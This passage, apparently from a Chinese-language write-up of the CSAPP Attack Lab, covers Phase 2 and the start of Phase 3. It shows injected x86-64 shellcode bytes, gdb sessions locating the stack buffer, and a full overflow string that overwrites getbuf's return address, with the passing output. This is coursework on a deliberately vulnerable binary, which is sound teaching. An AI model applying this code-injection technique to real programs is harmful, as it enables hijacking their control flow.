</span></code></pre></div></td></tr></table></div> <p>得到 p2.byte 文件的内容是: (即上述三条指令的字节表示)</p> <div class="language-asm highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-50-1>1</a></span>
<span class=normal><a href=#__codelineno-50-2>2</a></span>
<span class=normal><a href=#__codelineno-50-3>3</a></span>
<span class=normal><a href=#__codelineno-50-4>4</a></span>
<span class=normal><a href=#__codelineno-50-5>5</a></span>
<span class=normal><a href=#__codelineno-50-6>6</a></span>
<span class=normal><a href=#__codelineno-50-7>7</a></span>
<span class=normal><a href=#__codelineno-50-8>8</a></span>
<span class=normal><a href=#__codelineno-50-9>9</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-50-1><a id=__codelineno-50-1 name=__codelineno-50-1></a><span class=nl>p2.o:</span><span class=w>     </span><span class=nf>file</span><span class=w> </span><span class=no>format</span><span class=w> </span><span class=no>elf64-x86-64</span>
</span><span id=__span-50-2><a id=__codelineno-50-2 name=__codelineno-50-2></a>
</span><span id=__span-50-3><a id=__codelineno-50-3 name=__codelineno-50-3></a>
</span><span id=__span-50-4><a id=__codelineno-50-4 name=__codelineno-50-4></a><span class=nf>Disassembly</span><span class=w> </span><span class=no>of</span><span class=w> </span><span class=no>section</span><span class=w> </span><span class=no>.text</span><span class=p>:</span>
</span><span id=__span-50-5><a id=__codelineno-50-5 name=__codelineno-50-5></a>
</span><span id=__span-50-6><a id=__codelineno-50-6 name=__codelineno-50-6></a><span class=err>0000000000000000</span><span class=w> </span><span class=err>&lt;</span><span class=na>.text</span><span class=err>&gt;</span><span class=p>:</span>
</span><span id=__span-50-7><a id=__codelineno-50-7 name=__codelineno-50-7></a><span class=err>0:</span><span class=w>  </span><span class=err>48</span><span class=w> </span><span class=nf>c7</span><span class=w> </span><span class=no>c7</span><span class=w> </span><span class=no>fa</span><span class=w> </span><span class=mi>97</span><span class=w> </span><span class=no>b9</span><span class=w> </span><span class=mi>59</span><span class=w>    </span><span class=no>mov</span><span class=w>    </span><span class=no>$0x59b997fa</span><span class=p>,</span><span class=nv>%rdi</span>
</span><span id=__span-50-8><a id=__codelineno-50-8 name=__codelineno-50-8></a><span class=err>7:</span><span class=w>  </span><span class=err>68</span><span class=w> </span><span class=nf>ec</span><span class=w> </span><span class=mi>17</span><span class=w> </span><span class=mi>40</span><span class=w> </span><span class=mi>00</span><span class=w>          </span><span class=no>push</span><span class=w>   </span><span class=no>$0x4017ec</span>
</span><span id=__span-50-9><a id=__codelineno-50-9 name=__codelineno-50-9></a><span class=nl>c:</span><span class=w>  </span><span class=nf>c3</span><span class=w>                      </span><span class=no>ret</span>
</span></code></pre></div></td></tr></table></div> <p><code>gdb ctarget</code> 开始调试，得到缓冲区是从 0x5561dc78 开始的:</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-51-1> 1</a></span>
<span class=normal><a href=#__codelineno-51-2> 2</a></span>
<span class=normal><a href=#__codelineno-51-3> 3</a></span>
<span class=normal><a href=#__codelineno-51-4> 4</a></span>
<span class=normal><a href=#__codelineno-51-5> 5</a></span>
<span class=normal><a href=#__codelineno-51-6> 6</a></span>
<span class=normal><a href=#__codelineno-51-7> 7</a></span>
<span class=normal><a href=#__codelineno-51-8> 8</a></span>
<span class=normal><a href=#__codelineno-51-9> 9</a></span>
<span class=normal><a href=#__codelineno-51-10>10</a></span>
<span class=normal><a href=#__codelineno-51-11>11</a></span>
<span class=normal><a href=#__codelineno-51-12>12</a></span>
<span class=normal><a href=#__codelineno-51-13>13</a></span>
<span class=normal><a href=#__codelineno-51-14>14</a></span>
<span class=normal><a href=#__codelineno-51-15>15</a></span>
<span class=normal><a href=#__codelineno-51-16>16</a></span>
<span class=normal><a href=#__codelineno-51-17>17</a></span>
<span class=normal><a href=#__codelineno-51-18>18</a></span>
<span class=normal><a href=#__codelineno-51-19>19</a></span>
<span class=normal><a href=#__codelineno-51-20>20</a></span>
<span class=normal><a href=#__codelineno-51-21>21</a></span>
<span class=normal><a href=#__codelineno-51-22>22</a></span>
<span class=normal><a href=#__codelineno-51-23>23</a></span>
<span class=normal><a href=#__codelineno-51-24>24</a></span>
<span class=normal><a href=#__codelineno-51-25>25</a></span>
<span class=normal><a href=#__codelineno-51-26>26</a></span>
<span class=normal><a href=#__codelineno-51-27>27</a></span>
<span class=normal><a href=#__codelineno-51-28>28</a></span>
<span class=normal><a href=#__codelineno-51-29>29</a></span>
<span class=normal><a href=#__codelineno-51-30>30</a></span>
<span class=normal><a href=#__codelineno-51-31>31</a></span>
<span class=normal><a href=#__codelineno-51-32>32</a></span>
<span class=normal><a href=#__codelineno-51-33>33</a></span>
<span class=normal><a href=#__codelineno-51-34>34</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-51-1><a id=__codelineno-51-1 name=__codelineno-51-1></a>Linux$<span class=w> </span>gdb<span class=w> </span>--args<span class=w> </span>./ctarget<span class=w> </span>-q
</span><span id=__span-51-2><a id=__codelineno-51-2 name=__codelineno-51-2></a>Reading<span class=w> </span>symbols<span class=w> </span>from<span class=w> </span>./ctarget...
</span><span id=__span-51-3><a id=__codelineno-51-3 name=__codelineno-51-3></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>b<span class=w> </span>getbuf
</span><span id=__span-51-4><a id=__codelineno-51-4 name=__codelineno-51-4></a>Breakpoint<span class=w> </span><span class=m>1</span><span class=w> </span>at<span class=w> </span>0x4017a8:<span class=w> </span>file<span class=w> </span>buf.c,<span class=w> </span>line<span class=w> </span><span class=m>12</span>.
</span><span id=__span-51-5><a id=__codelineno-51-5 name=__codelineno-51-5></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>r
</span><span id=__span-51-6><a id=__codelineno-51-6 name=__codelineno-51-6></a>Starting<span class=w> </span>program:<span class=w> </span>/home/CSAPP/CSAPP-Lab/03-Attack-Lab/ctarget<span class=w> </span>-q
</span><span id=__span-51-7><a id=__codelineno-51-7 name=__codelineno-51-7></a><span class=o>[</span>Thread<span class=w> </span>debugging<span class=w> </span>using<span class=w> </span>libthread_db<span class=w> </span>enabled<span class=o>]</span>
</span><span id=__span-51-8><a id=__codelineno-51-8 name=__codelineno-51-8></a>Using<span class=w> </span>host<span class=w> </span>libthread_db<span class=w> </span>library<span class=w> </span><span class=s2>"/lib/x86_64-linux-gnu/libthread_db.so.1"</span>.
</span><span id=__span-51-9><a id=__codelineno-51-9 name=__codelineno-51-9></a>Cookie:<span class=w> </span>0x59b997fa
</span><span id=__span-51-10><a id=__codelineno-51-10 name=__codelineno-51-10></a>
</span><span id=__span-51-11><a id=__codelineno-51-11 name=__codelineno-51-11></a>Breakpoint<span class=w> </span><span class=m>1</span>,<span class=w> </span>getbuf<span class=w> </span><span class=o>()</span><span class=w> </span>at<span class=w> </span>buf.c:12
</span><span id=__span-51-12><a id=__codelineno-51-12 name=__codelineno-51-12></a>warning:<span class=w> </span><span class=m>12</span><span class=w>     </span>buf.c:<span class=w> </span>No<span class=w> </span>such<span class=w> </span>file<span class=w> </span>or<span class=w> </span>directory
</span><span id=__span-51-13><a id=__codelineno-51-13 name=__codelineno-51-13></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>disas
</span><span id=__span-51-14><a id=__codelineno-51-14 name=__codelineno-51-14></a>Dump<span class=w> </span>of<span class=w> </span>assembler<span class=w> </span>code<span class=w> </span><span class=k>for</span><span class=w> </span><span class=k>function</span><span class=w> </span>getbuf:
</span><span id=__span-51-15><a id=__codelineno-51-15 name=__codelineno-51-15></a><span class=o>=</span>&gt;<span class=w> </span>0x00000000004017a8<span class=w> </span>&lt;+0&gt;:<span class=w>     </span>sub<span class=w>    </span><span class=nv>$0</span>x28,%rsp
</span><span id=__span-51-16><a id=__codelineno-51-16 name=__codelineno-51-16></a>0x00000000004017ac<span class=w> </span>&lt;+4&gt;:<span class=w>     </span>mov<span class=w>    </span>%rsp,%rdi
</span><span id=__span-51-17><a id=__codelineno-51-17 name=__codelineno-51-17></a>0x00000000004017af<span class=w> </span>&lt;+7&gt;:<span class=w>     </span>call<span class=w>   </span>0x401a40<span class=w> </span>&lt;Gets&gt;
</span><span id=__span-51-18><a id=__codelineno-51-18 name=__codelineno-51-18></a>0x00000000004017b4<span class=w> </span>&lt;+12&gt;:<span class=w>    </span>mov<span class=w>    </span><span class=nv>$0</span>x1,%eax
</span><span id=__span-51-19><a id=__codelineno-51-19 name=__codelineno-51-19></a>0x00000000004017b9<span class=w> </span>&lt;+17&gt;:<span class=w>    </span>add<span class=w>    </span><span class=nv>$0</span>x28,%rsp
</span><span id=__span-51-20><a id=__codelineno-51-20 name=__codelineno-51-20></a>0x00000000004017bd<span class=w> </span>&lt;+21&gt;:<span class=w>    </span>ret
</span><span id=__span-51-21><a id=__codelineno-51-21 name=__codelineno-51-21></a>End<span class=w> </span>of<span class=w> </span>assembler<span class=w> </span>dump.
</span><span id=__span-51-22><a id=__codelineno-51-22 name=__codelineno-51-22></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>si
</span><span id=__span-51-23><a id=__codelineno-51-23 name=__codelineno-51-23></a><span class=m>14</span><span class=w>      </span><span class=k>in</span><span class=w> </span>buf.c
</span><span id=__span-51-24><a id=__codelineno-51-24 name=__codelineno-51-24></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>disas
</span><span id=__span-51-25><a id=__codelineno-51-25 name=__codelineno-51-25></a>Dump<span class=w> </span>of<span class=w> </span>assembler<span class=w> </span>code<span class=w> </span><span class=k>for</span><span class=w> </span><span class=k>function</span><span class=w> </span>getbuf:
</span><span id=__span-51-26><a id=__codelineno-51-26 name=__codelineno-51-26></a>0x00000000004017a8<span class=w> </span>&lt;+0&gt;:<span class=w>     </span>sub<span class=w>    </span><span class=nv>$0</span>x28,%rsp
</span><span id=__span-51-27><a id=__codelineno-51-27 name=__codelineno-51-27></a><span class=o>=</span>&gt;<span class=w> </span>0x00000000004017ac<span class=w> </span>&lt;+4&gt;:<span class=w>     </span>mov<span class=w>    </span>%rsp,%rdi
</span><span id=__span-51-28><a id=__codelineno-51-28 name=__codelineno-51-28></a>0x00000000004017af<span class=w> </span>&lt;+7&gt;:<span class=w>     </span>call<span class=w>   </span>0x401a40<span class=w> </span>&lt;Gets&gt;
</span><span id=__span-51-29><a id=__codelineno-51-29 name=__codelineno-51-29></a>0x00000000004017b4<span class=w> </span>&lt;+12&gt;:<span class=w>    </span>mov<span class=w>    </span><span class=nv>$0</span>x1,%eax
</span><span id=__span-51-30><a id=__codelineno-51-30 name=__codelineno-51-30></a>0x00000000004017b9<span class=w> </span>&lt;+17&gt;:<span class=w>    </span>add<span class=w>    </span><span class=nv>$0</span>x28,%rsp
</span><span id=__span-51-31><a id=__codelineno-51-31 name=__codelineno-51-31></a>0x00000000004017bd<span class=w> </span>&lt;+21&gt;:<span class=w>    </span>ret
</span><span id=__span-51-32><a id=__codelineno-51-32 name=__codelineno-51-32></a>End<span class=w> </span>of<span class=w> </span>assembler<span class=w> </span>dump.
</span><span id=__span-51-33><a id=__codelineno-51-33 name=__codelineno-51-33></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>p<span class=w> </span><span class=nv>$rsp</span>
</span><span id=__span-51-34><a id=__codelineno-51-34 name=__codelineno-51-34></a><span class=nv>$1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>(</span>void<span class=w> </span>*<span class=o>)</span><span class=w> </span>0x5561dc78
</span></code></pre></div></td></tr></table></div> <p>这样我们就可以得到需要输入的字符串了(p2.txt)，也就是 getbuf 函数接收的用户的输入：</p> <div class="language-text highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-52-1>1</a></span>
<span class=normal><a href=#__codelineno-52-2>2</a></span>
<span class=normal><a href=#__codelineno-52-3>3</a></span>
<span class=normal><a href=#__codelineno-52-4>4</a></span>
<span class=normal><a href=#__codelineno-52-5>5</a></span>
<span class=normal><a href=#__codelineno-52-6>6</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-52-1><a id=__codelineno-52-1 name=__codelineno-52-1></a>48 c7 c7 fa 97 b9 59 68 
</span><span id=__span-52-2><a id=__codelineno-52-2 name=__codelineno-52-2></a>ec 17 40 00 c3 00 00 00
</span><span id=__span-52-3><a id=__codelineno-52-3 name=__codelineno-52-3></a>00 00 00 00 00 00 00 00 
</span><span id=__span-52-4><a id=__codelineno-52-4 name=__codelineno-52-4></a>00 00 00 00 00 00 00 00 
</span><span id=__span-52-5><a id=__codelineno-52-5 name=__codelineno-52-5></a>00 00 00 00 00 00 00 00 
</span><span id=__span-52-6><a id=__codelineno-52-6 name=__codelineno-52-6></a>78 dc 61 55 00 00 00 00
</span></code></pre></div></td></tr></table></div> <p>此时，输入字符串后的栈帧应该是这样的：</p> <p><img alt="alt text" src=../../img/image-90.png></p> <p>逻辑如下：</p> <ul> <li>getbuf接收完我们刚才构造的字符串后，执行ret指令 (也就是将test程序的栈顶的0x5561dc78弹出，并将其赋值给%rip)，然后 %rip 跳转到被我们改写的返回地址 0x5561dc78</li> <li>程序执行我们编写的代码，当再次执行ret后，从栈中弹出的就是我们压入的touch2函数的地址，成功跳转</li> </ul> <p>然后把字符串转换成字节码：<code>./hex2raw &lt; p2.txt &gt; ans2.txt</code>，执行命令 <code>./ctarget -q -i ans2.txt</code> 就可以看到完成第二阶段的提示了：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-53-1>1</a></span>
<span class=normal><a href=#__codelineno-53-2>2</a></span>
<span class=normal><a href=#__codelineno-53-3>3</a></span>
<span class=normal><a href=#__codelineno-53-4>4</a></span>
<span class=normal><a href=#__codelineno-53-5>5</a></span>
<span class=normal><a href=#__codelineno-53-6>6</a></span>
<span class=normal><a href=#__codelineno-53-7>7</a></span>
<span class=normal><a href=#__codelineno-53-8>8</a></span>
<span class=normal><a href=#__codelineno-53-9>9</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-53-1><a id=__codelineno-53-1 name=__codelineno-53-1></a>Linux$<span class=w> </span>./ctarget<span class=w> </span>-q<span class=w> </span>-i<span class=w> </span>ans2.txt
</span><span id=__span-53-2><a id=__codelineno-53-2 name=__codelineno-53-2></a>Cookie:<span class=w> </span>0x59b997fa
</span><span id=__span-53-3><a id=__codelineno-53-3 name=__codelineno-53-3></a>Touch2!:<span class=w> </span>You<span class=w> </span>called<span class=w> </span>touch2<span class=o>(</span>0x59b997fa<span class=o>)</span>
</span><span id=__span-53-4><a id=__codelineno-53-4 name=__codelineno-53-4></a>Valid<span class=w> </span>solution<span class=w> </span><span class=k>for</span><span class=w> </span>level<span class=w> </span><span class=m>2</span><span class=w> </span>with<span class=w> </span>target<span class=w> </span>ctarget
</span><span id=__span-53-5><a id=__codelineno-53-5 name=__codelineno-53-5></a>PASS:<span class=w> </span>Would<span class=w> </span>have<span class=w> </span>posted<span class=w> </span>the<span class=w> </span>following:
</span><span id=__span-53-6><a id=__codelineno-53-6 name=__codelineno-53-6></a><span class=w>        </span>user<span class=w> </span>id<span class=w> </span>bovik
</span><span id=__span-53-7><a id=__codelineno-53-7 name=__codelineno-53-7></a><span class=w>        </span>course<span class=w>  </span><span class=m>15213</span>-f15
</span><span id=__span-53-8><a id=__codelineno-53-8 name=__codelineno-53-8></a><span class=w>        </span>lab<span class=w>     </span>attacklab
</span><span id=__span-53-9><a id=__codelineno-53-9 name=__codelineno-53-9></a><span class=w>        </span>result<span class=w>  </span><span class=m>1</span>:PASS:0xffffffff:ctarget:2:48<span class=w> </span>C7<span class=w> </span>C7<span class=w> </span>FA<span class=w> </span><span class=m>97</span><span class=w> </span>B9<span class=w> </span><span class=m>59</span><span class=w> </span><span class=m>68</span><span class=w> </span>EC<span class=w> </span><span class=m>17</span><span class=w> </span><span class=m>40</span><span class=w> </span><span class=m>00</span><span class=w> </span>C3<span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>78</span><span class=w> </span>DC<span class=w> </span><span class=m>61</span><span class=w> </span><span class=m>55</span><span class=w> </span>
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=phase-3_1>Phase 3<a class=headerlink href=#phase-3_1 title="Permanent link">¶</a></h3> <p>这一关和之前有点类似，只是需要传入一个字符串，所涉及的函数的 C 语言代码是：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-54-1> 1</a></span>
<span class=normal><a href=#__codelineno-54-2> 2</a></span>
<span class=normal><a href=#__codelineno-54-3> 3</a></span>
<span class=normal><a href=#__codelineno-54-4> 4</a></span>
<span class=normal><a href=#__codelineno-54-5> 5</a></span>
<span class=normal><a href=#__codelineno-54-6> 6</a></span>
<span class=normal><a href=#__codelineno-54-7> 7</a></span>
<span class=normal><a href=#__codelineno-54-8> 8</a></span>
<span class=normal><a href=#__codelineno-54-9> 9</a></span>
<span class=normal><a href=#__codelineno-54-10>10</a></span>
<span class=normal><a href=#__codelineno-54-11>11</a></span>
<span class=normal><a href=#__codelineno-54-12>12</a></span>
<span class=normal><a href=#__codelineno-54-13>13</a></span>
<span class=normal><a href=#__codelineno-54-14>14</a></span>
<span class=normal><a href=#__codelineno-54-15>15</a></span>
<span class=normal><a href=#__codelineno-54-16>16</a></span>
<span class=normal><a href=#__codelineno-54-17>17</a></span>
<span class=normal><a href=#__codelineno-54-18>18</a></span>
<span class=normal><a href=#__codelineno-54-19>19</a></span>
<span class=normal><a href=#__codelineno-54-20>20</a></span>
<span class=normal><a href=#__codelineno-54-21>21</a></span>
<span class=normal><a href=#__codelineno-54-22>22</a></span>
<span class=normal><a href=#__codelineno-54-23>23</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-54-1><a id=__codelineno-54-1 name=__codelineno-54-1></a><span class=kt>int</span><span class=w> </span><span class=nf>hexmatch</span><span class=p>(</span><span class=kt>unsigned</span><span class=w> </span><span class=n>val</span><span class=p>,</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>sval</span><span class=p>)</span>
</span><span id=__span-54-2><a id=__codelineno-54-2 name=__codelineno-54-2></a><span class=p>{</span>
</span><span id=__span-54-3><a id=__codelineno-54-3 name=__codelineno-54-3></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=n>cbuf</span><span class=p>[</span><span class=mi>110</span><span class=p>];</span><span class=w>                  </span><span class=c1>// 分配一个长度为 110 的字符数组</span>
</span><span id=__span-54-4><a id=__codelineno-54-4 name=__codelineno-54-4></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>s</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>cbuf</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>random</span><span class=p>()</span><span class=w> </span><span class=o>%</span><span class=w> </span><span class=mi>100</span><span class=p>;</span><span class=w> </span><span class=c1>// 在这 110 长度的数组中，随机选择一个小于 100 的起始位置</span>
</span><span id=__span-54-5><a id=__codelineno-54-5 name=__codelineno-54-5></a><span class=w>    </span><span class=n>sprintf</span><span class=p>(</span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=s>"%.8x"</span><span class=p>,</span><span class=w> </span><span class=n>val</span><span class=p>);</span>
</span><span id=__span-54-6><a id=__codelineno-54-6 name=__codelineno-54-6></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>strncmp</span><span class=p>(</span><span class=n>sval</span><span class=p>,</span><span class=w> </span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=mi>9</span><span class=p>)</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-54-7><a id=__codelineno-54-7 name=__codelineno-54-7></a><span class=p>}</span>
</span><span id=__span-54-8><a id=__codelineno-54-8 name=__codelineno-54-8></a>
</span><span id=__span-54-9><a id=__codelineno-54-9 name=__codelineno-54-9></a><span class=kt>void</span><span class=w> </span><span class=nf>touch3</span><span class=p>(</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>sval</span><span class=p>)</span>
</span><span id=__span-54-10><a id=__codelineno-54-10 name=__codelineno-54-10></a><span class=p>{</span>
</span><span id=__span-54-11><a id=__codelineno-54-11 name=__codelineno-54-11></a><span class=w>    </span><span class=n>vlevel</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>3</span><span class=p>;</span>
</span><span id=__span-54-12><a id=__codelineno-54-12 name=__codelineno-54-12></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>hexmatch</span><span class=p>(</span><span class=n>cookie</span><span class=p>,</span><span class=w> </span><span class=n>sval</span><span class=p>))</span>
</span><span id=__span-54-13><a id=__codelineno-54-13 name=__codelineno-54-13></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-54-14><a id=__codelineno-54-14 name=__codelineno-54-14></a><span class=w>        </span><span class=n>printf</span><span class=p>(</span><span class=s>"Touch3!: You called touch3(</span><span class=se>\"</span><span class=s>%s</span><span class=se>\"</span><span class=s>)</span><span class=se>\n</span><span class=s>"</span><span class=p>,</span><span class=w> </span><span class=n>sval</span><span class=p>);</span>
</span><span id=__span-54-15><a id=__codelineno-54-15 name=__codelineno-54-15></a><span class=w>        </span><span class=n>validate</span><span class=p>(</span><span class=mi>3</span><span class=p>);</span>
</span><span id=__span-54-16><a id=__codelineno-54-16 name=__codelineno-54-16></a><span class=w>    </span><span class=p>}</span><span class=w> </span>
</span><span id=__span-54-17><a id=__codelineno-54-17 name=__codelineno-54-17></a><span class=w>    </span><span class=k>else</span><span class=w> </span>
</span><span id=__span-54-18><a id=__codelineno-54-18 name=__codelineno-54-18></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-54-19><a id=__codelineno-54-19 name=__codelineno-54-19></a><span class=w>        </span><span class=n>printf</span><span class=p>(</span><span class=s>"Misfire: You called touch3(</span><span class=se>\"</span><span class=s>%s</span><span class=se>\"</span><span class=s>)</span><span class=se>\n</span><span class=s>"</span><span class=p>,</span><span class=w> </span><span class=n>sval</span><span class=p>);</span>
</span><span id=__span-54-20><a id=__codelineno-54-20 name=__codelineno-54-20></a><span class=w>        </span><span class=n>fail</span><span class=p>(</span><span class=mi>3</span><span class=p>);</span>
</span><span id=__span-54-21><a id=__codelineno-54-21 name=__codelineno-54-21></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-54-22><a id=__codelineno-54-22 name=__codelineno-54-22></a><span class=w>    </span><span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span><span id=__span-54-23><a id=__codelineno-54-23 name=__codelineno-54-23></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>也就是说，要把 cookie 转换成对应的字符串传进去。注意 <code>char *s = cbuf + random() % 100</code>，s的位置是随机的，我们写在<code>getbuf</code>栈中的字符串很有可能被覆盖，一旦被覆盖就无法正常比较。因此，考虑把cookie的字符串数据存在<code>test</code>的栈上，其它部分与上题相同，这里不再重复思路。</p> <p>先查找<code>test</code>栈顶指针的位置：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-55-1> 1</a></span>
<span class=normal><a href=#__codelineno-55-2> 2</a></span>
<span class=normal><a href=#__codelineno-55-3> 3</a></span>
<span class=normal><a href=#__codelineno-55-4> 4</a></span>
<span class=normal><a href=#__codelineno-55-5> 5</a></span>
<span class=normal><a href=#__codelineno-55-6> 6</a></span>
<span class=normal><a href=#__codelineno-55-7> 7</a></span>
<span class=normal><a href=#__codelineno-55-8> 8</a></span>
<span class=normal><a href=#__codelineno-55-9> 9</a></span>
<span class=normal><a href=#__codelineno-55-10>10</a></span>
<span class=normal><a href=#__codelineno-55-11>11</a></span>
<span class=normal><a href=#__codelineno-55-12>12</a></span>
<span class=normal><a href=#__codelineno-55-13>13</a></span>
<span class=normal><a href=#__codelineno-55-14>14</a></span>
<span class=normal><a href=#__codelineno-55-15>15</a></span>
<span class=normal><a href=#__codelineno-55-16>16</a></span>
<span class=normal><a href=#__codelineno-55-17>17</a></span>
<span class=normal><a href=#__codelineno-55-18>18</a></span>
<span class=normal><a href=#__codelineno-55-19>19</a></span>
<span class=normal><a href=#__codelineno-55-20>20</a></span>
<span class=normal><a href=#__codelineno-55-21>21</a></span>
<span class=normal><a href=#__codelineno-55-22>22</a></span>
<span class=normal><a href=#__codelineno-55-23>23</a></span>
<span class=normal><a href=#__codelineno-55-24>24</a></span>
<span class=normal><a href=#__codelineno-55-25>25</a></span>
<span class=normal><a href=#__codelineno-55-26>26</a></span>
<span class=normal><a href=#__codelineno-55-27>27</a></span>
<span class=normal><a href=#__codelineno-55-28>28</a></span>
<span class=normal><a href=#__codelineno-55-29>29</a></span>
<span class=normal><a href=#__codelineno-55-30>30</a></span>
<span class=normal><a href=#__codelineno-55-31>31</a></span>
<span class=normal><a href=#__codelineno-55-32>32</a></span>
<span class=normal><a href=#__codelineno-55-33>33</a></span>
<span class=normal><a href=#__codelineno-55-34>34</a></span>
<span class=normal><a href=#__codelineno-55-35>35</a></span>
<span class=normal><a href=#__codelineno-55-36>36</a></span>
<span class=normal><a href=#__codelineno-55-37>37</a></span>
<span class=normal><a href=#__codelineno-55-38>38</a></span>
<span class=normal><a href=#__codelineno-55-39>39</a></span>
<span class=normal><a href=#__codelineno-55-40>40</a></span>
<span class=normal><a href=#__codelineno-55-41>41</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-55-1><a id=__codelineno-55-1 name=__codelineno-55-1></a>Linux$<span class=w> </span>gdb<span class=w> </span>--args<span class=w> </span>./ctarget<span class=w> </span>-q
</span><span id=__span-55-2><a id=__codelineno-55-2 name=__codelineno-55-2></a>Reading<span class=w> </span>symbols<span class=w> </span>from<span class=w> </span>./ctarget...
</span><span id=__span-55-3><a id=__codelineno-55-3 name=__codelineno-55-3></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>b<span class=w> </span><span class=nb>test</span><span class=w>                                          </span>
</span><span id=__span-55-4><a id=__codelineno-55-4 name=__codelineno-55-4></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>r
</span><span id=__span-55-5><a id=__codelineno-55-5 name=__codelineno-55-5></a>Starting<span class=w> </span>program:<span class=w> </span>/home/CSAPP/CSAPP-Lab/03-Attack-Lab/ctarget<span class=w> </span>-q<span class=w>                                                </span>
</span><span id=__span-55-6><a id=__codelineno-55-6 name=__codelineno-55-6></a>Using<span class=w> </span>host<span class=w> </span>libthread_db<span class=w> </span>library<span class=w> </span><span class=s2>"/lib/x86_64-linux-gnu/libthread_db.so.1"</span>.
</span><span id=__span-55-7><a id=__codelineno-55-7 name=__codelineno-55-7></a>Cookie:<span class=w> </span>0x59b997fa
</span><span id=__span-55-8><a id=__codelineno-55-8 name=__codelineno-55-8></a>
</span><span id=__span-55-9><a id=__codelineno-55-9 name=__codelineno-55-9></a>Breakpoint<span class=w> </span><span class=m>1</span>,<span class=w> </span><span class=nb>test</span><span class=w> </span><span class=o>()</span><span class=w> </span>at<span class=w> </span>visible.c:90
</span><span id=__span-55-10><a id=__codelineno-55-10 name=__codelineno-55-10></a>warning:<span class=w> </span><span class=m>90</span><span class=w>     </span>visible.c:<span class=w> </span>No<span class=w> </span>such<span class=w> </span>file<span class=w> </span>or<span class=w> </span>directory
</span><span id=__span-55-11><a id=__codelineno-55-11 name=__codelineno-55-11></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>disas
</span><span id=__span-55-12><a id=__codelineno-55-12 name=__codelineno-55-12></a>Dump<span class=w> </span>of<span class=w> </span>assembler<span class=w> </span>code<span class=w> </span><span class=k>for</span><span class=w> </span><span class=k>function</span><span class=w> </span>test:
</span><span id=__span-55-13><a id=__codelineno-55-13 name=__codelineno-55-13></a><span class=o>=</span>&gt;<span class=w> </span>0x0000000000401968<span class=w> </span>&lt;+0&gt;:<span class=w>     </span>sub<span class=w>    </span><span class=nv>$0</span>x8,%rsp
</span><span id=__span-55-14><a id=__codelineno-55-14 name=__codelineno-55-14></a>0x000000000040196c<span class=w> </span>&lt;+4&gt;:<span class=w>     </span>mov<span class=w>    </span><span class=nv>$0</span>x0,%eax
</span><span id=__span-55-15><a id=__codelineno-55-15 name=__codelineno-55-15></a>0x0000000000401971<span class=w> </span>&lt;+9&gt;:<span class=w>     </span>call<span class=w>   </span>0x4017a8<span class=w> </span>&lt;getbuf&gt;<span class=w> </span><span class=c1># call == %rsp - 0x8, 并将返回地址0x401976压入栈中</span>
